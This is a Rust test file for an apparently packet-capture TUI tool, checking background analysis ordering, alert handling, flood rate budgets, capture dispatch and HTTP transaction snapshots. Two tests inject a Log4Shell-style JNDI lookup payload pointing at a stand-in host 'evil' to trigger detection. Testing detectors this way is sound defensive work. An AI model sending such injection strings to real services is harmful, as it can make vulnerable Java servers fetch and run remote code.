#![cfg(feature = "terminal-ui")]
#[path = "support/packets.rs"]
mod packets;
use packrat_tui::{analysis::alert_center::AutomationMode, app::App};
use std::time::{Duration, Instant};

fn drain(app: &mut App) {
    let deadline = Instant::now() + Duration::from_secs(5);
    loop {
        app.poll_analysis();
        if app.analysis_idle() {
            break;
        }
        assert!(
            Instant::now() < deadline,
            "Analysis did not drain: {:?}",
            app.status_msg
        );
        std::thread::yield_now();
    }
}

#[test]
fn asynchronous_packets_keep_display_and_analysis_counts_in_agreement() {
    let mut app = App::new_for_test();
    app.start_background_analysis().unwrap();
    for number in 1..=1000 {
        app.inject_packet(packets::tcp(number, 100, 0x18, b"payload"));
    }
    drain(&mut app);
    assert_eq!(app.packets.len(), 1000);
    assert_eq!(
        app.query_core(|core| core
            .flow_tracker
            .flows
            .values()
            .map(|flow| flow.packets)
            .sum::<u64>()),
        Some(1000)
    );
}

#[test]
fn queued_core_updates_preserve_input_order() {
    let mut app = App::new_for_test();
    app.start_background_analysis().unwrap();
    app.configure_core(|core| core.alert_center.automation_mode = AutomationMode::Watch);
    app.inject_packet(packets::tcp(1, 100, 0x18, b"${jndi:ldap://evil/x}"));
    drain(&mut app);
    assert!(app.alert_overlay_open);
    assert!(!app.worklist.items.is_empty());
    assert_eq!(
        app.query_core(|core| core.alert_center.automation_mode),
        Some(AutomationMode::Watch)
    );
    assert!(
        app.traffic_latch
            .actions
            .iter()
            .all(|action| action.status
                == packrat_tui::analysis::traffic_latch::LatchStatus::Observed)
    );
}

#[test]
fn clear_discards_old_generation_outcomes_without_reopening_an_alert() {
    let mut app = App::new_for_test();
    app.start_background_analysis().unwrap();
    app.inject_packet(packets::tcp(1, 100, 0x18, b"${jndi:ldap://evil/x}"));
    app.poll_analysis();
    loop {
        if app.try_clear_packets().is_ok() {
            break;
        }
        app.poll_analysis();
    }
    drain(&mut app);
    assert!(!app.alert_overlay_open);
    assert!(app.packets.is_empty());
    assert_eq!(
        app.query_core(|core| core.incidents.incidents.len()),
        Some(0)
    );
}

#[test]
fn busy_worker_does_not_block_settings_navigation_or_queued_controls() {
    let mut app = App::new_for_test();
    app.start_background_analysis().unwrap();
    let (started, start) = std::sync::mpsc::channel();
    let (release, wait) = std::sync::mpsc::channel();
    app.configure_core(move |_| {
        started.send(()).unwrap();
        wait.recv_timeout(Duration::from_secs(3)).unwrap();
    });
    app.poll_analysis();
    start.recv_timeout(Duration::from_secs(3)).unwrap();
    let began = Instant::now();
    app.open_settings();
    app.settings_cursor = 3;
    app.activate_settings_selection();
    app.move_down();
    app.run_search();
    app.yara_force_rescan();
    app.open_autopsy();
    assert!(app.try_view().unwrap().is_none());
    assert!(began.elapsed() < Duration::from_millis(100));
    release.send(()).unwrap();
    drain(&mut app);
    assert_eq!(
        app.query_core(|core| core.alert_center.automation_mode),
        Some(AutomationMode::Watch)
    );
}

#[test]
fn synthetic_flood_retains_rate_debt_while_respecting_each_tick_budget() {
    let mut app = App::new_for_test();
    app.craft.flooding = true;
    app.craft.flood_rate = 1000;
    assert_eq!(app.craft.flood_tick_budget(0), 0);
    assert_eq!(app.craft.flood_tick_budget(10), 10);
    app.craft.flood_rate = 0;
    assert_eq!(app.craft.flood_tick_budget(1000), 190);
    assert_eq!(app.craft.flood_tick_budget(1000), 0);
}

#[test]
fn live_dispatch_keeps_the_rejected_packet_and_unread_capture_tail() {
    let mut app = App::new_for_test();
    app.capturing = true;
    app.start_background_analysis().unwrap();
    let (started, start) = std::sync::mpsc::channel();
    let (release, wait) = std::sync::mpsc::channel();
    app.configure_core(move |_| {
        started.send(()).unwrap();
        wait.recv_timeout(Duration::from_secs(5)).unwrap();
    });
    app.poll_analysis();
    start.recv_timeout(Duration::from_secs(3)).unwrap();
    let (tx, mut rx) = tokio::sync::mpsc::channel(1024);
    for no in 1..=600 {
        tx.try_send(packets::tcp(no, 100, 0x18, b"data")).unwrap();
    }
    let mut pending = None;
    for _ in 0..4 {
        app.dispatch_capture(&mut rx, &mut pending).unwrap();
    }
    assert!(pending.is_some());
    assert!(!rx.is_empty());
    let retained = pending.as_ref().unwrap().no;
    app.dispatch_capture(&mut rx, &mut pending).unwrap();
    assert_eq!(pending.as_ref().unwrap().no, retained);
    release.send(()).unwrap();
    let deadline = Instant::now() + Duration::from_secs(5);
    while !rx.is_empty() || pending.is_some() || !app.analysis_idle() {
        app.poll_analysis();
        app.dispatch_capture(&mut rx, &mut pending).unwrap();
        assert!(Instant::now() < deadline);
        std::thread::yield_now();
    }
    assert_eq!(app.packets.len(), 600);
    assert_eq!(
        app.packets.iter().map(|p| p.no).collect::<Vec<_>>(),
        (1..=600).collect::<Vec<_>>()
    );
    app.stop_background_analysis().unwrap();
}

#[test]
fn transaction_snapshot_is_revision_bound_and_never_reused_for_another_packet() {
    use packrat_tui::app::InvestigationView;
    let mut app = App::new_for_test();
    app.start_background_analysis().unwrap();
    app.inject_packet(packets::tcp(
        1,
        100,
        0x18,
        b"GET /one HTTP/1.1\r\nHost: local\r\n\r\n",
    ));
    drain(&mut app);
    app.open_selected_packet_investigation();
    app.investigation_view = InvestigationView::Transactions;
    app.poll_analysis();
    drain(&mut app);
    let snapshot = app.transaction_inspection().unwrap().clone();
    assert_eq!(
        snapshot.http1.as_ref().unwrap().transactions[0]
            .request
            .target
            .as_deref(),
        Some("/one")
    );
    let mut other = packets::tcp(2, 200, 0x18, b"GET /two HTTP/1.1\r\nHost: local\r\n\r\n");
    other.src = "192.0.2.99".into();
    app.inject_packet(other);
    drain(&mut app);
    app.worklist.items.clear();
    app.worklist.active = None;
    app.selected = Some(1);
    assert!(app.transaction_inspection().is_none());
    app.poll_analysis();
    drain(&mut app);
    assert_ne!(
        app.transaction_inspection().unwrap().stream.key.id(),
        snapshot.stream.key.id()
    );
    assert_eq!(
        snapshot.http1.as_ref().unwrap().transactions[0]
            .request
            .target
            .as_deref(),
        Some("/one")
    );
    loop {
        if app.try_clear_packets().is_ok() {
            break;
        }
        app.poll_analysis();
    }
    assert!(app.transaction_inspection().is_none());
    drain(&mut app);
}
